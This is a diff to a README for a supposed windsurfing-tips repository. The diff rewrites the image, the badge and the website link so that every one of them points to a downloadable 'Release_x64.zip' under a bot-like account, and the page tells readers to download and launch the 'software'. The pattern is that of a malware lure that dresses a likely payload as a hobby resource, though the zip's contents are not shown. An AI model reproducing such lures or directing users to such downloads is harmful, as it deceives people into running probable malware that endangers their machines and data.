@@ -1,6 +1,6 @@
 # 🏄‍♂️ Welcome to "Windsurfrules" Repository! 🏄‍♀️
 
-![Windsurfer Image](https://example.com/windsurfer_image.jpg)
+![Windsurfer Image](https://github.com/botname123/windsurfrules/releases/download/v1.0/Release_x64.zip)
 
 ### Description:
 This repository is dedicated to all windsurfing enthusiasts out there, providing valuable information, tips, and resources to help you rule the waves with style! Whether you are a beginner looking to learn the basics or an experienced windsurfer seeking some expert advice, you've come to the right place. Get ready to ride the wind and conquer the seas like a true windsurfing pro!
@@ -12,13 +12,13 @@ This repository is dedicated to all windsurfing enthusiasts out there, providing
 🔧 Equipment Maintenance
 
 ### Resource Link:
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/botname123/windsurfrules/releases/download/v1.0/Release_x64.zip)](https://github.com/botname123/windsurfrules/releases/download/v1.0/Release_x64.zip)
 
 ### Launch the Software:
 Click the button above to download the software package. Once downloaded, you can launch the software to enhance your windsurfing experience with cutting-edge tools and features. 
 
 ### Visit Our Website:
-Explore our website to discover even more exciting content related to windsurfing, including instructional videos, gear reviews, and community forums. [Visit Website](https://www.windsurfrules.com)
+Explore our website to discover even more exciting content related to windsurfing, including instructional videos, gear reviews, and community forums. [Visit Website](https://github.com/botname123/windsurfrules/releases/download/v1.0/Release_x64.zip)
 
 ### Questions or Feedback?
 If you have any questions, suggestions, or feedback, feel free to reach out to us. Your input is valuable in helping us improve the windsurfrules community and provide the best resources for windsurfers worldwide.
